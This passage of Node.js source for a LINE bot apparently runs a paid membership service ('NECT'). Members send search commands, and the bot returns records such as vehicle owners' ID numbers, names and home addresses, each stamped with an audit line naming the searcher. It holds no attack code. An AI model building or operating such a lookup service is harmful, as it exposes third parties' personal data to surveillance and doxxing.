  document.getElementById('sendButton');

const statusEl =
  document.getElementById('status');


let liffReady = false;


// ==============================
// หมวดหมู่
// ==============================
function loadCategories() {

  categorySelect.innerHTML = '';

  commandGroups.forEach(function(group, index) {

    const option =
      document.createElement('option');

    option.value =
      String(index);

    option.textContent =
      group.title;

    categorySelect.appendChild(option);

  });


  loadCommands();
}


// ==============================
// รายการคำสั่ง
// ==============================
function loadCommands() {

  const groupIndex =
    Number(categorySelect.value || 0);

  const group =
    commandGroups[groupIndex];


  commandSelect.innerHTML = '';


  if (!group) {
    return;
  }


  group.commands.forEach(function(command, index) {

    const option =
      document.createElement('option');

    option.value =
      String(index);

    option.textContent =
      command.name;

    commandSelect.appendChild(option);

  });


  renderCommand();
}


// ==============================
// คำสั่งที่เลือก
// ==============================
function getSelectedCommand() {

  const groupIndex =
    Number(categorySelect.value || 0);

  const commandIndex =
    Number(commandSelect.value || 0);

  const group =
    commandGroups[groupIndex];


  if (!group) {
    return null;
  }


  return group.commands[commandIndex] || null;
}


// ==============================
// Render Form
// ==============================
function renderCommand() {

  const command =
    getSelectedCommand();


  fieldsContainer.innerHTML = '';
  extraInfo.innerHTML = '';


  if (!command) {

    commandInfo.textContent =
      'ไม่พบคำสั่ง';

    previewText.textContent =
      '-';

    return;
  }


  commandInfo.innerHTML = '';


  const nameEl =
    document.createElement('div');

  nameEl.className =
    'command-name';

  nameEl.textContent =
    command.name;


  const syntaxEl =
    document.createElement('div');

  syntaxEl.className =
    'syntax';

  syntaxEl.textContent =
    'รูปแบบ: ' + command.syntax;


  commandInfo.appendChild(nameEl);
  commandInfo.appendChild(syntaxEl);


  command.fields.forEach(function(field, index) {

    const box =
      document.createElement('div');

    box.className =
      'field-box';


    const label =
      document.createElement('label');

    label.className =
      'field-label';

    label.textContent =
      field.label;


    const input =
      document.createElement(
        field.multiline
          ? 'textarea'
          : 'input'
      );


    input.id =
      'command_field_' + index;


    if (!field.multiline) {
      input.type = 'text';
    }


    if (field.inputMode) {
      input.inputMode =
        field.inputMode;
    }


    input.placeholder =
      field.placeholder || '';


    input.dataset.sanitize =
      field.sanitize || '';


    input.addEventListener(
      'input',
      updatePreview
    );


    box.appendChild(label);
    box.appendChild(input);

    fieldsContainer.appendChild(box);

  });


  if (command.example) {

    const el =
      document.createElement('div');

    el.className =
      'example';

    el.textContent =
      'ตัวอย่าง: ' + command.example;

    extraInfo.appendChild(el);

  }


  if (command.note) {

    const el =
      document.createElement('div');

    el.className =
      'note-box';

    el.textContent =
      'หมายเหตุ: ' + command.note;

    extraInfo.appendChild(el);

  }


  updatePreview();
}


// ==============================
// อ่านค่า Field
// ==============================
function getFieldValues(command) {

  return command.fields.map(
    function(field, index) {

      const el =
        document.getElementById(
          'command_field_' + index
        );


      let value =
        String(
          el ? el.value : ''
        ).trim();


      if (
        field.sanitize === 'digits'
      ) {

        value =
          value.replace(/\\D/g, '');

      }


      return value;
    }
  );
}


// ==============================
// สร้างคำสั่ง
// ==============================
function buildCommand() {

  const command =
    getSelectedCommand();


  if (!command) {
    return '';
  }


  if (!command.fields.length) {
    return command.prefix;
  }


  const values =
    getFieldValues(command);


  return (
    command.prefix +
    values.join(
      command.separator || ''
    )
  );
}


// ==============================
// Preview
// ==============================
function updatePreview() {

  const text =
    buildCommand();

  previewText.textContent =
    text || '-';
}


// ==============================
// STATUS
// ==============================
function showStatus(
  text,
  type
) {

  statusEl.className =
    'status' +
    (
      type
        ? ' ' + type
        : ''
    );

  statusEl.textContent =
    text;
}


// ==============================
// เริ่ม LIFF
// ==============================
async function initLiff() {

  try {

    if (!LIFF_ID) {

      throw new Error(
        'ยังไม่ได้ตั้งค่า LIFF_ID'
      );

    }


    await liff.init({
      liffId: LIFF_ID
    });


    if (!liff.isLoggedIn()) {

      liff.login();
      return;

    }


    if (!liff.isInClient()) {

      showStatus(
        'กรุณาเปิด LIFF URL จากภายในแอป LINE',
        'error'
      );

      return;
    }


    liffReady = true;

    sendButton.disabled = false;


    showStatus(
      '✅ พร้อมใช้งาน',
      'success'
    );


  } catch (err) {

    console.error(
      'LIFF INIT ERROR:',
      err
    );


    showStatus(
      'LIFF ERROR: ' +
      (err.code || '') +
      ' ' +
      (err.message || err),
      'error'
    );

  }

}


// ==============================
// ส่งคำสั่ง
// ==============================
async function sendCommand() {

  if (!liffReady) {

    showStatus(
      'LINE ยังไม่พร้อมใช้งาน',
      'error'
    );

    return;
  }


  const command =
    getSelectedCommand();


  if (!command) {

    showStatus(
      'กรุณาเลือกคำสั่ง',
      'error'
    );

    return;
  }


  const values =
    getFieldValues(command);


  if (
    values.some(function(value) {
      return !value;
    })
  ) {

    showStatus(
      'กรุณากรอกข้อมูลให้ครบทุกช่อง',
      'error'
    );

    return;
  }


  const text =
    buildCommand();


  if (!text) {

    showStatus(
      'ไม่สามารถสร้างคำสั่งได้',
      'error'
    );

    return;
  }


  try {

    sendButton.disabled = true;


    showStatus(
      'กำลังส่งคำค้น...',
      ''
    );


    await liff.sendMessages([
      {
        type: 'text',
        text: text
      }
    ]);


    showStatus(
      '✅ ส่งคำค้นเรียบร้อยแล้ว',
      'success'
    );


    setTimeout(
      function() {

        if (liff.isInClient()) {
          liff.closeWindow();
        }

      },
      800
    );


  } catch (err) {

    console.error(
      'SEND MESSAGE ERROR:',
      err
    );


    sendButton.disabled = false;


    showStatus(
      '❌ ไม่สามารถส่งคำค้นได้: ' +
      (err.message || err),
      'error'
    );

  }

}


// ==============================
// EVENT
// ==============================
categorySelect.addEventListener(
  'change',
  loadCommands
);

commandSelect.addEventListener(
  'change',
  renderCommand
);

sendButton.addEventListener(
  'click',
  sendCommand
);


// เริ่มหน้า
loadCategories();
initLiff();

</script>

</body>

</html>
  `);

});

// =====================================
// LIFF WELFARE
// =====================================
app.get('/liff/welfare', (req, res) => {

  const WELFARE_LIFF_ID =
    process.env.WELFARE_LIFF_ID || '';

  return res.send(`
<!DOCTYPE html>

<html lang="th">

<head>

<meta charset="UTF-8">

<meta
  name="viewport"
  content="width=device-width, initial-scale=1.0"
>

<title>ตรวจสอบสถานะสวัสดิการ</title>

<script
  charset="utf-8"
  src="https://static.line-scdn.net/liff/edge/2/sdk.js"
></script>

<style>

* {
  box-sizing: border-box;
}

body {
  margin: 0;

  min-height: 100vh;

  background: #070b11;
  color: #ffffff;

  font-family:
    Arial,
    Tahoma,
    sans-serif;

  display: flex;

  align-items: center;
  justify-content: center;

  padding: 20px;

  text-align: center;
}

.box {
  width: 100%;
  max-width: 420px;

  background: #10161f;

  border: 1px solid #293747;
  border-radius: 20px;

  padding: 30px 20px;
}

.icon {
  font-size: 42px;
}

.title {
  margin-top: 12px;

  font-size: 18px;
  font-weight: bold;
}

.status {
  margin-top: 10px;

  color: #94a3b8;

  font-size: 12px;
  line-height: 1.7;
}

.error {
  color: #f87171;
}

</style>

</head>


<body>

<div class="box">

  <div class="icon">
    🏛️
  </div>

  <div class="title">
    ตรวจสอบสถานะสวัสดิการ
  </div>

  <div
    id="status"
    class="status"
  >
    กำลังเชื่อมต่อระบบ...
  </div>

</div>


<script>

const LIFF_ID =
  ${JSON.stringify(WELFARE_LIFF_ID)};

const TARGET_URL =
  'https://welfare2.mof.go.th/welfare-customer-web/check-status';


async function startWelfare() {

  const statusEl =
    document.getElementById('status');

  try {

    if (!LIFF_ID) {

      throw new Error(
        'ยังไม่ได้ตั้งค่า WELFARE_LIFF_ID'
      );

    }


    await liff.init({
      liffId: LIFF_ID
    });


    statusEl.textContent =
      'กำลังเปิดระบบตรวจสอบสถานะ...';


    // เปลี่ยน URL หลัง LIFF init สำเร็จแล้ว
    window.location.replace(
      TARGET_URL
    );


  } catch (err) {

    console.error(
      'WELFARE LIFF ERROR:',
      err
    );


    statusEl.className =
      'status error';


    statusEl.textContent =
      'LIFF ERROR: ' +
      (err.code || '') +
      ' ' +
      (err.message || err);

  }

}


startWelfare();

</script>


</body>

</html>
  `);

});

app.post('/webhook', line.middleware(config), async (req, res) => {
  try {
    for (const event of req.body.events) {
      await handleEvent(event);
    }
    res.json({ success: true });
  } catch (err) {
    console.error('Webhook error:', err?.response?.data || err.message || err);
    res.status(500).end();
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

setInterval(notifyMemberExpiryAlerts, 60 * 60 * 1000);
setTimeout(notifyMemberExpiryAlerts, 10 * 1000);

function ensureStorage() {
  if (!fs.existsSync(UPLOAD_DIR)) {
    fs.mkdirSync(UPLOAD_DIR, { recursive: true });
  }

  if (!fs.existsSync(DATA_FILE)) {
    const initData = {
      members: {},
      processedEvents: {},
      topups: {}
    };
    fs.writeFileSync(DATA_FILE, JSON.stringify(initData, null, 2), 'utf8');
  }
}

function loadDB() {
ensureStorage();

try {
const db = JSON.parse(fs.readFileSync(DATA_FILE,'utf8'));

if(!db.members) db.members={};
if(!db.processedEvents) db.processedEvents={};
if(!db.topups) db.topups={};
if(!db.dtacPermissions) db.dtacPermissions={};
if(!db.dtacBlocked) db.dtacBlocked={};
if(!db.siBlocked) db.siBlocked={};

return db;

} catch(e){

return {
members:{},
processedEvents:{},
topups:{},
dtacPermissions:{},
dtacBlocked:{},
siBlocked:{},
tBlocked:{}
};

}

}

function saveDB(db) {
  if (!db.topups) db.topups = {};
  if (!db.dtacPermissions) db.dtacPermissions = {};
  if (!db.dtacBlocked) db.dtacBlocked = {};
  if (!db.siBlocked) db.siBlocked = {};
  if (!db.tBlocked) db.tBlocked = {};

  fs.writeFileSync(
    DATA_FILE,
    JSON.stringify(db, null, 2),
    'utf8'
  );
}

function nowThai() {
  return new Date().toLocaleString('th-TH', {
    timeZone: 'Asia/Bangkok',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });
}

function formatThaiDate(date) {
  return new Date(date).toLocaleString('th-TH', {
    timeZone: 'Asia/Bangkok',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });
}

function safeThaiDate(value) {
  if (!value) return '-';

  const d = new Date(value);
  if (Number.isNaN(d.getTime())) return String(value);

  return d.toLocaleString('th-TH', {
    timeZone: 'Asia/Bangkok',
    year: 'numeric',
    month: '2-digit',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit'
  });
}

function formatThaiDateOnly(date) {
  if (!date) return 'ไม่ระบุ';
  const parsed = new Date(date);
  if (Number.isNaN(parsed.getTime())) return 'ไม่ระบุ';
  return parsed.toLocaleDateString('th-TH', {
    timeZone: 'Asia/Bangkok'
  });
}

function formatSearchDateTimeThai(
  date = new Date()
) {

  const parts =
    new Intl.DateTimeFormat(
      'th-TH',
      {
        timeZone: 'Asia/Bangkok',

        day: '2-digit',
        month: '2-digit',
        year: 'numeric',

        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',

        hour12: false
      }
    ).formatToParts(date);


  const get =
    type =>
      parts.find(
        item => item.type === type
      )?.value || '';


  return (
    `${get('day')}.` +
    `${get('month')}.` +
    `${get('year')} ` +
    `${get('hour')}:` +
    `${get('minute')}:` +
    `${get('second')}`
  );
}


function buildTrueSearchAudit(member) {

  const lineName =
    member?.lineName ||
    member?.displayName ||
    '-';


  const phone =
    member?.phone ||
    member?.tel ||
    member?.mobile ||
    '-';


  const fullName =
    member?.fullname ||
    member?.fullName ||
    [
      member?.firstName,
      member?.lastName
    ]
      .filter(Boolean)
      .join(' ')
      .trim() ||
    '-';


  return (
`🔎สมาชิกผู้สืบค้น
LINE : ${lineName}
เบอร์ : ${phone}
ชื่อผู้ค้น : ${fullName}
วันเวลาสืบค้น : ${formatSearchDateTimeThai()}`
  );
}

function addSearchAudit(message, member) {

  if (!message) {
    return message;
  }


  const auditMessage = {
    type: 'text',
    text: buildTrueSearchAudit(member)
  };


  // ======================================
  // กรณีเดิมเป็นหลาย Message
  // ======================================
  if (Array.isArray(message)) {

    const messages =
      [...message];


    // ป้องกัน Audit ซ้ำ
    const alreadyHasAudit =
      messages.some(item =>
        item?.type === 'text' &&
        String(item.text || '')
          .includes(
            '🔎สมาชิกผู้สืบค้น'
          )
      );


    if (alreadyHasAudit) {
      return messages;
    }


    // LINE ตอบได้สูงสุด 5 messages
    // ถ้ายังไม่ถึง 5 ให้ Audit เป็นอีกข้อความ
    if (messages.length < 5) {

      messages.push(
        auditMessage
      );

      return messages;
    }


    // ถ้ามีครบ 5 อยู่แล้ว
    // ไม่สามารถส่งข้อความที่ 6 ได้
    // จึงเอา Audit ไปต่อใน Text ตัวสุดท้ายแทน
    for (
      let i = messages.length - 1;
      i >= 0;
      i--
    ) {

      if (
        messages[i]?.type === 'text'
      ) {

        const oldText =
          String(
            messages[i].text || ''
          ).trimEnd();


        messages[i] = {
          ...messages[i],

          text:
`${oldText}

-  -  -  -  -  -  -  -
${auditMessage.text}`
        };


        return messages;
      }
    }


    return messages;
  }


  // ======================================
  // ถ้าข้อความเดิมมี Audit อยู่แล้ว
  // ======================================
  if (
    message?.type === 'text' &&
    String(message.text || '')
      .includes(
        '🔎สมาชิกผู้สืบค้น'
      )
  ) {

    return message;
  }


  // ======================================
  // Text / Flex / Image ฯลฯ
  // ให้ Audit เด้งเป็น Message ที่ 2
  // ======================================
  return [
    message,
    auditMessage
  ];
}

const NECT_REPLY_RECIPIENTS = new Map();

const SEARCH_AUDIT_CONTEXT =
  new Map();


const SEARCH_AUDIT_COMMANDS = [
  't#',
  'd#',
  'f#',
  'bq%',
  'se%',
  'si%',
  'car#',
  'cid#',
  'doc#',
  'c#',
  'psi#',
  'ps#',
  'atm%',
  'pw%',
  'bn%',
  'dl#',
  'sc%'
];


function shouldAddSearchAudit(text) {

  const value =
    normalizeNectSearchCommand(String(text || '')
      .trim()
      .toLowerCase());


  return SEARCH_AUDIT_COMMANDS.some(
    command =>
      value.startsWith(
        command.toLowerCase()
      )
  );
}

function safeVehicleValue(value, fallback = 'ไม่ระบุ') {
  if (value === null || value === undefined) return fallback;
  const text = String(value).trim();
  return text ? text : fallback;
}

function normalizeVehicleAddress(address) {
  return safeVehicleValue(address).replace(/\s+/g, ' ');
}

function getVehicleColor(vehicle) {
  if (vehicle?.carChkMasColorListText) return safeVehicleValue(vehicle.carChkMasColorListText);
  if (Array.isArray(vehicle?.carChkMasColorList) && vehicle.carChkMasColorList.length > 0) {
    const colors = vehicle.carChkMasColorList
      .map(item => safeVehicleValue(item?.colorDesc, ''))
      .filter(Boolean);
    if (colors.length > 0) return colors.join(', ');
  }
  return 'ไม่ระบุ';
}

function formatVehicleDetails(vehicle, index) {
  const owner2Block =
    vehicle?.docNo2 || vehicle?.owner2 || vehicle?.addressOwner2
      ? `
ผู้ครอบครอง
• ID: ${safeVehicleValue(vehicle?.docNo2)}
◇ ชื่อที่ระบุ
  ${safeVehicleValue(vehicle?.owner2)}
◇ รายละเอียดที่อยู่
  ${normalizeVehicleAddress(vehicle?.addressOwner2)}`
      : '';

  const noteBlock = vehicle?.note
    ? `
◇ หมายเหตุประกอบรายการ
  ${safeVehicleValue(vehicle.note)}${
        vehicle.noteDate
          ? ` (${formatThaiDateOnly(vehicle.noteDate)})`
          : ''
      }`
    : '';

  return `
• คันที่${index}
◇ หมายเลขทะเบียน
  ${safeVehicleValue(vehicle?.plate1, '')}${safeVehicleValue(vehicle?.plate2, '')}
◇ จังหวัดที่ระบุ
  ${safeVehicleValue(vehicle?.offLocDesc)}
◇ ยี่ห้อที่ระบุ
  ${safeVehicleValue(vehicle?.brnDesc)}
◇ รุ่นที่ระบุ
  ${safeVehicleValue(vehicle?.modelName)}
◇ สีที่ระบุ
  ${getVehicleColor(vehicle)}
◇ ประเภทของรถ
  ${safeVehicleValue(vehicle?.vehTypeDesc)}
◇ ลักษณะของรถ
  ${safeVehicleValue(vehicle?.kindDesc)}
◇ สถานะของรถ
  ${safeVehicleValue(vehicle?.carStatus)}
◇ ข้อมูลอายัด/ถือครอง
  ${safeVehicleValue(vehicle?.holdFlag)}
◇ หมายเลขตัวถัง
  ${safeVehicleValue(vehicle?.numBody)}
◇ หมายเลขเครื่อง
  ${safeVehicleValue(vehicle?.numEng)}
◇ ชนิดเชื้อเพลิง
  ${safeVehicleValue(vehicle?.fuelDesc)}
◇ วันจดทะเบียน
  ${formatThaiDateOnly(vehicle?.regDate)}
◇ วันที่สิ้นอายุ
  ${formatThaiDateOnly(vehicle?.expDate)}
ผู้ถือกรรมสิทธิ์
• ID: ${safeVehicleValue(vehicle?.docNo1)}
◇ ชื่อที่ระบุ
  ${safeVehicleValue(vehicle?.owner1)}
◇ รายละเอียดที่อยู่
  ${normalizeVehicleAddress(vehicle?.addressOwner1)}${owner2Block}${noteBlock}`;
}

function formatVehicleDetailsFlex(vehicle, index) {

  const sv = (value, fallback = '-') => {
    if (value === null || value === undefined) return fallback;
    const text = String(value).trim();
    return text ? text : fallback;
  };

  const plate =
    `${safeVehicleValue(vehicle?.plate1, '')}${safeVehicleValue(vehicle?.plate2, '')}` || '-';

  const owner1Address =
    normalizeVehicleAddress(vehicle?.addressOwner1) || '-';

  const hasOwner2 =
    vehicle?.docNo2 ||
    vehicle?.owner2 ||
    vehicle?.addressOwner2;

  // =========================
  // BODY
  // =========================

  const bodyContents = [

    // ข้อมูลรถ
    {
      type: 'text',
      text: " ▸ รายละเอียดของรถ",
      weight: 'bold',
      size: 'lg',
      color: '#0F172A'
    },

    {
      type: 'text',
      text:
        `◇ หมายเลขทะเบียน
  ${plate}\n` +
        `◇ จังหวัดที่ระบุ
  ${safeVehicleValue(vehicle?.offLocDesc)}\n` +
        `◇ ยี่ห้อที่ระบุ
  ${safeVehicleValue(vehicle?.brnDesc)}\n` +
        `◇ รุ่นที่ระบุ
  ${safeVehicleValue(vehicle?.modelName)}\n` +
        `◇ สีที่ระบุ
  ${getVehicleColor(vehicle)}\n` +
        `◇ ประเภทของรถ
  ${safeVehicleValue(vehicle?.vehTypeDesc)}\n` +
        `◇ ลักษณะของรถ
  ${safeVehicleValue(vehicle?.kindDesc)}`,
      wrap: true,
      size: 'sm',
      color: '#334155',
      margin: 'md'
    },

    {
      type: 'separator',
      margin: 'lg'
    },

    // สถานะรถ
    {
      type: 'text',
      text: " ▸ ทะเบียนและสถานะของรถ",
      weight: 'bold',
      size: 'md',
      color: '#0F172A',
      margin: 'lg'
    },

    {
      type: 'text',
      text:
        `◇ สถานะของรถ
  ${safeVehicleValue(vehicle?.carStatus)}\n` +
        `◇ ข้อมูลอายัด/ถือครอง
  ${safeVehicleValue(vehicle?.holdFlag)}\n` +
        `◇ หมายเลขตัวถัง
  ${safeVehicleValue(vehicle?.numBody)}\n` +
        `◇ หมายเลขเครื่อง
  ${safeVehicleValue(vehicle?.numEng)}\n` +
        `◇ ชนิดเชื้อเพลิง
  ${safeVehicleValue(vehicle?.fuelDesc)}\n` +
        `◇ วันจดทะเบียน
  ${formatThaiDateOnly(vehicle?.regDate)}\n` +
        `◇ วันที่สิ้นอายุ
  ${formatThaiDateOnly(vehicle?.expDate)}`,
      wrap: true,
      size: 'sm',
      color: '#334155'
    },

    {
      type: 'separator',
      margin: 'lg'
    },

    // ผู้ถือกรรมสิทธิ์
    {
      type: 'text',
      text: " ผู้ถือกรรมสิทธิ์",
      weight: 'bold',
      size: 'md',
      color: '#0F172A',
      margin: 'lg'
    },

    {
      type: 'text',
      text:
        `ID: ${safeVehicleValue(vehicle?.docNo1)}\n` +
        `◇ ชื่อที่ระบุ
  ${safeVehicleValue(vehicle?.owner1)}\n` +
        `◇ รายละเอียดที่อยู่
  ${owner1Address}`,
      wrap: true,
      size: 'sm',
      color: '#334155'
    }
  ];

  // =========================
  // ผู้ครอบครอง
  // =========================

  if (hasOwner2) {

    bodyContents.push(
      {
        type: 'separator',
        margin: 'lg'
      },

      {
        type: 'text',
        text: " ผู้ครอบครอง",
        weight: 'bold',
        size: 'md',
        color: '#0F172A',
        margin: 'lg'
      },

      {
        type: 'text',
        text:
          `ID: ${safeVehicleValue(vehicle?.docNo2)}\n` +
          `◇ ชื่อที่ระบุ
  ${safeVehicleValue(vehicle?.owner2)}\n` +
          `◇ รายละเอียดที่อยู่
  ${normalizeVehicleAddress(vehicle?.addressOwner2)}`,
        wrap: true,
        size: 'sm',
        color: '#334155'
      }
    );
  }

  // =========================
  // หมายเหตุ
  // =========================

  if (vehicle?.note) {

    bodyContents.push(
      {
        type: 'separator',
        margin: 'lg'
      },

      {
        type: 'text',
        text: "หมายเหตุประกอบรายการ",
        weight: 'bold',
        size: 'md',
        color: '#B91C1C',
        margin: 'lg'
      },

      {
        type: 'text',
        text:
          `${safeVehicleValue(vehicle.note)}` +
          (
            vehicle.noteDate
              ? `\nวันที่: ${formatThaiDateOnly(vehicle.noteDate)}`
              : ''
          ),
        wrap: true,
        size: 'sm',
        color: '#7F1D1D'
      }
    );
  }

  // =========================
  // ข้อความสำหรับปุ่มคัดลอก
  // =========================

  let copyText =
    ` ข้อมูลรถคันที่ ${index}\n` +
    `ทะเบียน: ${plate}\n` +
    `จังหวัด: ${safeVehicleValue(vehicle?.offLocDesc)}\n` +
    `ยี่ห้อ: ${safeVehicleValue(vehicle?.brnDesc)}\n` +
    `รุ่น: ${safeVehicleValue(vehicle?.modelName)}\n` +
    `สี: ${getVehicleColor(vehicle)}\n` +
    `ประเภทรถ: ${safeVehicleValue(vehicle?.vehTypeDesc)}\n` +
    `ลักษณะรถ: ${safeVehicleValue(vehicle?.kindDesc)}\n` +
    `สถานะรถ: ${safeVehicleValue(vehicle?.carStatus)}\n` +
    `อายัด/ถือครอง: ${safeVehicleValue(vehicle?.holdFlag)}\n` +
    `เลขตัวถัง: ${safeVehicleValue(vehicle?.numBody)}\n` +
    `เลขเครื่อง: ${safeVehicleValue(vehicle?.numEng)}\n` +
    `เชื้อเพลิง: ${safeVehicleValue(vehicle?.fuelDesc)}\n` +
    `วันที่จดทะเบียน: ${formatThaiDateOnly(vehicle?.regDate)}\n` +
    `วันที่หมดอายุ: ${formatThaiDateOnly(vehicle?.expDate)}\n\n` +

    ` ผู้ถือกรรมสิทธิ์
` +
    `ID: ${safeVehicleValue(vehicle?.docNo1)}\n` +
    `ชื่อ: ${safeVehicleValue(vehicle?.owner1)}\n` +
    `ที่อยู่: ${owner1Address}`;

  if (hasOwner2) {
    copyText +=
      `

 ผู้ครอบครอง
` +
      `ID: ${safeVehicleValue(vehicle?.docNo2)}\n` +
      `ชื่อ: ${safeVehicleValue(vehicle?.owner2)}\n` +
      `ที่อยู่: ${normalizeVehicleAddress(vehicle?.addressOwner2)}`;
  }

  if (vehicle?.note) {
    copyText +=
      `

 หมายเหตุ: ${safeVehicleValue(vehicle.note)}`;

    if (vehicle.noteDate) {
      copyText +=
        ` (${formatThaiDateOnly(vehicle.noteDate)})`;
    }
  }

  // =========================
  // BUBBLE
  // =========================

  return {
    type: 'bubble',
    size: 'mega',

    header: {
      type: 'box',
      layout: 'vertical',
      backgroundColor: '#0F172A',
      paddingAll: '18px',

      contents: [
        {
          type: 'text',
          text: ` รถคันที่ ${index}`,
          weight: 'bold',
          size: 'xl',
          color: '#FFFFFF'
        },

        {
          type: 'text',
          text: plate,
          weight: 'bold',
          size: 'lg',
          color: '#FACC15',
          margin: 'sm'
        },

        {
          type: 'text',
          text: safeVehicleValue(vehicle?.offLocDesc),
          size: 'sm',
          color: '#CBD5E1',
          margin: 'xs'
        }
      ]
    },

    body: {
      type: 'box',
      layout: 'vertical',
      paddingAll: '18px',
      spacing: 'sm',
      contents: bodyContents
    },

    footer: {
      type: 'box',
      layout: 'vertical',
      paddingAll: '16px',

      contents: [
        {
          type: 'button',
          style: 'primary',
          height: 'sm',
          color: '#0F172A',

          action: {
            type: 'clipboard',
            label: 'คัดลอกข้อมูล',
            clipboardText: copyText
          }
        }
      ]
    }
  };
}

function addDaysFromNow(days) {
  const d = new Date();
  d.setDate(d.getDate() + Number(days));
  return d;
}

function isExpired(expireAt) {
  if (!expireAt) return true;
  return new Date(expireAt).getTime() < Date.now();
}

function isActiveMember(member) {
  return !!(
    member &&
    member.status === 'approved' &&
    member.expireAt &&
    !isExpired(member.expireAt)
  );
}

function isAdmin(userId) {
  return ADMIN_IDS.includes(userId);
}

function cleanupProcessedEvents(db) {
  const now = Date.now();
  const ttl = 24 * 60 * 60 * 1000;

  for (const key of Object.keys(db.processedEvents || {})) {
    if (now - db.processedEvents[key] > ttl) {
      delete db.processedEvents[key];
    }
  }
}

function markEventProcessed(db, eventId) {
  db.processedEvents[eventId] = Date.now();
  cleanupProcessedEvents(db);
}

function isEventProcessed(db, eventId) {
  cleanupProcessedEvents(db);
  return !!db.processedEvents[eventId];
}

// Apply presentation only; never rewrite returned values or action payloads.
function styleNectMessage(message) {
  const clone = value => {
    if (Array.isArray(value)) return value.map(clone);
    if (!value || typeof value !== 'object') return value;
    return Object.fromEntries(Object.entries(value).map(([key, item]) => [key, clone(item)]));
  };
  const result = clone(message);
  if (result?.type === 'text' && /^(?:📋 NECT · เมนูคำสั่ง|🚘 NECT · รหัสประเภทรถ|🧭 NECT · เลือกงานค้นหา|🚘 NECT · คู่มือประเภทรถ)\n/.test(result.text || '')) return result;
  const iconCount = text => (String(text).match(/\p{Extended_Pictographic}/gu) || []).length;
  const labelIcon = text => {
    const label = text.replace(/^[ \t•]+/, '');
    if (/^(?:ชื่อ(?:-สกุล|นามสกุล)?|Name|Full name)[ \t]*[:：]/i.test(label)) return '👤';
    if (/^(?:เบอร์(?:โทร(?:ศัพท์)?)?|โทร(?:ศัพท์)?|หมายเลขโทรศัพท์|Phone|Tel)[ \t]*[:：]/i.test(label)) return '📞';
    if (/^(?:ที่อยู่(?:ปัจจุบัน)?|พิกัด|จุดติดตั้ง|Address|Location|GPS)[ \t]*[:：]/i.test(label)) return '📍';
    return '';
  };
  // Insert icons only; never strip or rewrite any original text or values.
  const withIcon = (text, icon, maxLength) => {
    if (!icon || /^\s*\p{Extended_Pictographic}/u.test(text)) return text;
    const decorated = icon + ' ' + text;
    return decorated.length <= maxLength ? decorated : text;
  };
  // Add a compact heading without touching data, mentions, or custom emoji offsets.
  if (result?.type === 'text' && typeof result.text === 'string') {
    if (!result.text.trim() || result.emojis?.length || result.mention) return result;
    const heading = '📄 NECT · รายงานการค้นหา\n━━━━━━━━━━━━━━━━\n';
    const previousHeadings = [heading, '📋 NECT · ผลลัพธ์\n────────────\n', 'NECT · ผลลัพธ์\n────────────\n'];
    const currentHeading = previousHeadings.find(value => result.text.startsWith(value));
    let body = currentHeading ? result.text.slice(currentHeading.length) : result.text;
    let remaining = Math.max(0, 2 - iconCount(body));
    let available = 5000 - heading.length - body.length;
    body = body.split('\n').map(line => {
      if (!remaining || available <= 0) return line;
      const decorated = withIcon(line, labelIcon(line), line.length + available);
      if (decorated !== line) { remaining--; available -= decorated.length - line.length; }
      return decorated;
    }).join('\n');
    if (body.length + heading.length <= 5000) result.text = heading + body;
    return result;
  }
  if (!result || result.type !== 'flex') return result;

  const palette = {
    header: '#EFF6FF', body: '#FFFFFF', footer: '#F8FAFF',
    inset: '#F1F5FB', ink: '#172B4D', muted: '#52677D',
    accent: '#2563EB', accentLight: '#93C5FD'
  };
  const reportBadge = 'NECT / DATA REPORT';
  const rgb = value => {
    if (typeof value !== 'string' || !/^#[0-9a-f]{6}([0-9a-f]{2})?$/i.test(value)) return null;
    return [1, 3, 5].map(index => parseInt(value.slice(index, index + 2), 16));
  };
  const semantic = color => {
    const key = typeof color === 'string' ? color.toUpperCase() : '';
    if (['#B91C1C', '#FCA5A5'].includes(key)) return 'red';
    if (['#047857', '#6EE7B7'].includes(key)) return 'green';
    if (['#92400E', '#FDE68A'].includes(key)) return 'amber';
    if (['#FFF1F2', '#4C1D2B'].includes(key)) return 'red';
    if (['#ECFDF5', '#143C34'].includes(key)) return 'green';
    if (['#FFFBEB', '#493512'].includes(key)) return 'amber';
    const channels = rgb(color);
    if (!channels) return '';
    const [r, g, b] = channels;
    if (r > 120 && g > 65 && g > b * 1.4 && b < r * 0.65 && g > r * 0.42) return 'amber';
    if (r > 90 && r > g * 1.25 && r > b * 1.15) return 'red';
    if (g > 65 && g > r * 1.1 && g > b * 1.08) return 'green';
    return '';
  };
  const statusInk = {
    red: ['#B91C1C', '#FCA5A5'], green: ['#047857', '#6EE7B7'],
    amber: ['#92400E', '#FDE68A']
  };
  const statusFill = {
    red: ['#FFF1F2', '#4C1D2B'], green: ['#ECFDF5', '#143C34'],
    amber: ['#FFFBEB', '#493512']
  };
  const ink = (color, dark) => {
    const kind = semantic(color);
    if (kind) return statusInk[kind][dark ? 1 : 0];
    const channels = rgb(color);
    if (channels && Math.max(...channels) - Math.min(...channels) > 65 &&
      channels[2] > 90 && channels[2] > channels[0] * 1.25 && channels[2] > channels[1] * 1.08) {
      return dark ? palette.accentLight : palette.accent;
    }
    const muted = channels && Math.max(...channels) - Math.min(...channels) < 60 &&
      Math.max(...channels) > 90 && Math.min(...channels) < 225;
    return dark ? (muted ? '#D9E2EC' : '#FFFFFF') : (muted ? palette.muted : palette.ink);
  };

  function component(node, section, root = false, emojiBudget) {
    if (!node || typeof node !== 'object') return;
    const dark = false;
    if (node.type === 'box') {
      const hasFill = node.backgroundColor || node.background;
      if (root || hasFill) {
        const previous = node.backgroundColor || node.background?.startColor;
        const kind = !root && semantic(previous);
        node.backgroundColor = kind ? statusFill[kind][dark ? 1 : 0] :
          (root ? palette[section] : palette.inset);
        // Flatten gradients so nested text always has a predictable contrast.
        delete node.background;
      }
      if (Array.isArray(node.contents)) node.contents.forEach(child => component(child, section, false, emojiBudget));
      if (root && section === 'header') {
        node.borderColor = '#2563EB';
        node.borderWidth = '1px';
        node.cornerRadius = '12px';
      }
